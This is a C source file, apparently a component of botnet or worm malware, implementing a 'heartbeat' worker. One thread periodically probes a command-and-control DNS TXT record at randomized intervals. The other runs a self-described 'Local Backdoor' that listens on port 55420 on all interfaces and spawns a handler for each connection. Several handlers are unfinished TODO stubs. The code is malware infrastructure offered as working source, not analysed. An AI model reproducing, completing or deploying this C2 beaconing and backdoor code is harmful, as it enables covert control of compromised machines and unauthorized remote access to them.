#include "htbt.h"
#include "util_rt.h"
#include "protocol.h"
#include "llist.h"
#include "dvault.h"
#include "pth.h"
#include "endian.h"

#include <errno.h>
#include <fcntl.h>
#include <poll.h>

// CNCP interval: HTBT_CNCP_INT_MIN + variance
#define HTBT_CNCP_INT_MIN	1800000 // half an hour minimum interval
#define HTBT_CNCP_INT_VAR	1800000 // half an hour variance
#define HTBT_CNCP_PORT		prne_htobe16(55420)

typedef struct {
	pth_t pth;
	prne_htbt_t *parent;
	struct pollfd pfd;
} htbt_lbd_client_t;

typedef struct {
	pth_mutex_t lock;
	pth_cond_t cond;
	prne_htbt_op_t op;
	void *req_body; // NULL if abandoned
	prne_htbt_status_t rsp;
} htbt_req_slip_t;

struct prne_htbt {
	pth_t sigterm_pth;
	mbedtls_ctr_drbg_context *rnd;
	prne_resolv_t *resolv;
	prne_llist_t req_q;
	bool loop_flag;
	struct { // Main
		pth_mutex_t lock;
		pth_cond_t cond;
	} main;
	struct { // CNC DNS Record Probe
		pth_t pth;
		pth_mutex_t lock;
		pth_cond_t cond;
		prne_pth_cv_t cv;
	} cncp;
	struct { // Local Backdoor
		pth_t pth;
		struct pollfd pfd;
		prne_llist_t conn_list; // TODO: init
	} lbd;
};

#define HTBT_INTP_CTX(x) prne_htbt_t *ctx = (prne_htbt_t*)(x);


static void fin_htbt_wkr (void *p) {
	// TODO
}

static void free_htbt_wkr_ctx (void *p) {
	HTBT_INTP_CTX(p);

	// TODO

	if (ctx->cncp.pth != NULL) {
		pth_abort(ctx->cncp.pth);
	}
	if (ctx->lbd.pth != NULL) {
		pth_abort(ctx->lbd.pth);
	}
}

static void *htbt_main_entry (void *p) {
	HTBT_INTP_CTX(p);

	prne_assert(pth_resume(ctx->lbd.pth));
	prne_assert(pth_resume(ctx->cncp.pth));

	// TODO

	prne_close(ctx->lbd.pfd.fd);
	ctx->lbd.pfd.fd = -1;
	prne_pth_cv_notify(&ctx->cncp.cv);
	prne_assert(pth_join(ctx->lbd.pth, NULL));
	prne_assert(pth_join(ctx->cncp.pth, NULL));

	return NULL;
}

static void htbt_cncp_do_probe (prne_htbt_t *ctx) {
	prne_resolv_prm_t prm;
	bool r_ret;

	prne_resolv_init_prm(&prm);

	r_ret = prne_resolv_prm_gettxtrec(
		ctx->resolv,
		prne_dvault_get_cstr(PRNE_DATA_KEY_CNC_TXT_REC, NULL),
		&ctx->cncp.cv,
		&prm);
	if (!r_ret) {
		return;
	}

	prne_pth_cond_timedwait(&ctx->cncp.cv, NULL, NULL);
	if (prm.fut->qr == PRNE_RESOLV_QR_OK) {
		// TODO
		// <entries in hex> <txt rec name suffix>
	}

	prne_resolv_free_prm(&prm);
}

static void *htbt_cncp_entry (void *p) { // TODO: this works?
	HTBT_INTP_CTX(p);
	unsigned long intvar;
	struct timespec timeout;

	while (true) {
		// calc interval variance
		intvar = 0;
		mbedtls_ctr_drbg_random(ctx->rnd, &intvar, sizeof(intvar));
		intvar = HTBT_CNCP_INT_MIN + (intvar % HTBT_CNCP_INT_VAR);
		timeout = prne_ms_timespec(intvar);

		// wait
		prne_pth_cond_timedwait(&ctx->cncp.cv, &timeout, NULL);
		if (!ctx->loop_flag) {
			break;
		}

		htbt_cncp_do_probe(ctx);
	}

	return NULL;
}

static void *htbt_lbd_client_entry (void *p) {
	prne_llist_entry_t *ent = (prne_llist_entry_t*)p;
	htbt_lbd_client_t *ctx = (htbt_lbd_client_t*)ent->element;

	// TODO

	prne_close(ctx->pfd.fd);
	ctx->pfd.fd = -1;
}

static void *htbt_lbd_entry (void *p) {
	HTBT_INTP_CTX(p);
	int fret;
	pth_event_t ev = NULL, ev_sub;
	prne_llist_entry_t *ent;
	htbt_lbd_client_t *client;
	bool rebuild_ev = true;

	while (true) {
		if (rebuild_ev) {
			pth_event_free(ev, TRUE);
			ev = NULL;

			ent = ctx->lbd.conn_list.head;
			while (ent != NULL) {
				ev_sub = pth_event(
					PTH_EVENT_TID | PTH_STATE_DEAD,
					((htbt_lbd_client_t*)ent->element)->pth);
				prne_assert(ev_sub != NULL);
				if (ev == NULL) {
					ev = ev_sub;
				}
				else {
					prne_assert(pth_event_concat(ev, ev_sub, NULL) != NULL);
				}

				ent = ent->next;
			}

			rebuild_ev = false;
		}

		if (ctx->lbd.pfd.fd < 0) {
			break;
		}
		fret = pth_poll_ev(&ctx->lbd.pfd, 1, -1, ev);

		if (ev != NULL && pth_event_occurred(ev)) {
			ent = ctx->lbd.conn_list.head;
			while (ent != NULL) {
				client = (htbt_lbd_client_t*)ent->element;

				if (client->pfd.fd < 0) {
					pth_join(client->pth, NULL);
					prne_free(client);
					ent = prne_llist_erase(&ctx->lbd.conn_list, ent);
					rebuild_ev = true;
				}
				else {
					ent = ent->next;
				}
			}
		}

		if (fret < 0 && errno != EINTR) {
			break;
		}
		else if (fret > 0) {
			if (ctx->lbd.pfd.revents & (POLLERR | POLLHUP | POLLNVAL)) {
				break;
			}
			else if (ctx->lbd.pfd.revents & POLLIN) {
				client = NULL;
				ent = NULL;
				fret = accept(ctx->lbd.pfd.fd, NULL, NULL);
				do {
					if (fret < 0) {
						break;
					}

					client = (htbt_lbd_client_t*)prne_malloc(
						sizeof(htbt_lbd_client_t),
						1);
					if (client == NULL) {
						break;
					}

					client->pth = NULL;
					client->parent = ctx;
					client->pfd.fd = fret;

					ent = prne_llist_append(&ctx->lbd.conn_list, client);
					if (ent == NULL) {
						break;
					}

					client->pth = pth_spawn(
						PTH_ATTR_DEFAULT,
						htbt_lbd_client_entry,
						ent);
					if (client->pth == NULL) {
						break;
					}

					fret = -1;
					client = NULL;
					ent = NULL;
					rebuild_ev = true;
				} while (false);

				if (client != NULL) {
					if (client->pth != NULL) {
						pth_abort(client->pth);
					}
				}
				if  (ent != NULL) {
					prne_llist_erase(&ctx->lbd.conn_list, ent);
				}
				prne_close(fret);
			}
		}
	}

	pth_event_free(ev, TRUE);

	ent = ctx->lbd.conn_list.head;
	while (ent != NULL) {
		client = (htbt_lbd_client_t*)ent->element;

		prne_close(client->pfd.fd);
		client->pfd.fd = -1;
		pth_join(client->pth, NULL);

		prne_free(client);

		ent = ent->next;
	}
	prne_llist_clear(&ctx->lbd.conn_list);

	return NULL;
}

prne_htbt_t *prne_alloc_htbt_worker (
	prne_worker_t *w,
	pth_t sigterm_pth,
	prne_resolv_t *resolv,
	mbedtls_ctr_drbg_context *ctr_drbg)
{
	prne_htbt_t *ret = NULL;
	uint8_t m_sckaddr[prne_op_max(
		sizeof(struct sockaddr_in),
		sizeof(struct sockaddr_in6))];

	if (sigterm_pth == NULL || ctr_drbg == NULL) {
		errno = EINVAL;
		goto ERR;
	}

	ret = prne_calloc(sizeof(prne_htbt_t), 1);
	if (ret == NULL) {
		goto ERR;
	}

	ret->sigterm_pth = sigterm_pth;
	ret->rnd = ctr_drbg;
	ret->resolv = resolv;
	prne_init_llist(&ret->req_q);
	ret->loop_flag = true;
	pth_mutex_init(&ret->main.lock);
	pth_cond_init(&ret->main.cond);

	ret->cncp.pth = NULL;
	pth_mutex_init(&ret->cncp.lock);
	pth_cond_init(&ret->cncp.cond);
	ret->cncp.cv.broadcast = false;
	ret->cncp.cv.lock = &ret->cncp.lock;
	ret->cncp.cv.cond = &ret->cncp.cond;

	ret->lbd.pth = NULL;
	ret->lbd.pfd.fd = -1;
	prne_init_llist(&ret->lbd.conn_list);

	if (resolv != NULL) {
		ret->cncp.pth = pth_spawn(
			PTH_ATTR_DEFAULT,
			htbt_cncp_entry,
			ret);
		if (ret->cncp.pth == NULL) {
			goto ERR;
		}
		if (pth_suspend(ret->cncp.pth) == 0) {
			goto ERR;
		}
	}

	do {
		socklen_t sl;

		memzero(m_sckaddr, sizeof(m_sckaddr));
		if ((ret->lbd.pfd.fd = socket(AF_INET6, SOCK_STREAM, 0)) >= 0) {
			((struct sockaddr_in6*)m_sckaddr)->sin6_addr = in6addr_any;
			((struct sockaddr_in6*)m_sckaddr)->sin6_family = AF_INET6;
			((struct sockaddr_in6*)m_sckaddr)->sin6_port = HTBT_CNCP_PORT;
			sl = sizeof(struct sockaddr_in6);
		}
		else if ((ret->lbd.pfd.fd = socket(AF_INET, SOCK_STREAM, 0)) >= 0) {
			((struct sockaddr_in*)m_sckaddr)->sin_addr.s_addr = INADDR_ANY;
			((struct sockaddr_in*)m_sckaddr)->sin_family = AF_INET;
			((struct sockaddr_in*)m_sckaddr)->sin_port = HTBT_CNCP_PORT;
			sl = sizeof(struct sockaddr_in);
		}
		else {
			break;
		}

		if (fcntl(ret->lbd.pfd.fd, F_SETFL, O_NONBLOCK) != 0) {
			break;
		}
		if (bind(ret->lbd.pfd.fd, (struct sockaddr*)m_sckaddr, sl) != 0) {
			break;
		}
		ret->lbd.pfd.events = POLLIN;

		ret->lbd.pth = pth_spawn(PTH_ATTR_DEFAULT, htbt_lbd_entry, ret);
		if (pth_suspend(ret->lbd.pth) == 0) {
			goto ERR;
		}
	} while (false);

	if (ret->cncp.pth == NULL && ret->lbd.pth == NULL) {
		// No producer
		goto ERR;
	}

	w->ctx = ret;
	w->entry = htbt_main_entry;
	w->fin = fin_htbt_wkr;
	w->free_ctx = free_htbt_wkr_ctx;

	return ret;
ERR:
	if (ret != NULL) {
		const int saved_errno = errno;
		free_htbt_wkr_ctx(ret);
		errno = saved_errno;
	}
	return NULL;
}
